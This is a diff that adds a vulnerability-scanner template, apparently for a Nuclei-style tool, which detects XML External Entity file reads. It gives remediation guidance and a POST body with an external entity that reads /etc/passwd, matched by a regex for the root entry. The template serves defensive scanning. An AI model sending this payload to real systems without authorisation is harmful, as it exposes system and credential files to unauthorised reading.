@@ -1,0 +1,19 @@
+id: xxe-file-read
+info:
+  name: XML External Entity (XXE) - Local File Read
+  severity: critical
+  tags: [xxe, injection, xml]
+  description: "The endpoint parsed an XML body containing an external entity declaration and reflected the contents of /etc/passwd, confirming an XXE vulnerability. An attacker can read any file readable by the web process, probe internal services via SSRF, and in some configurations achieve remote code execution."
+  remediation: "Disable external entity processing in the XML parser (DTD processing off). In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). In PHP: libxml_disable_entity_loader(true). In Python: use defusedxml."
+  cwe: "CWE-611"
+  owasp: "A05:2021-Security Misconfiguration"
+
+requests:
+  - method: POST
+    path: /
+    headers:
+      Content-Type: application/xml
+    body: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    matchers:
+      - type: regex
+        regex: ["root:.*:0:0:"]
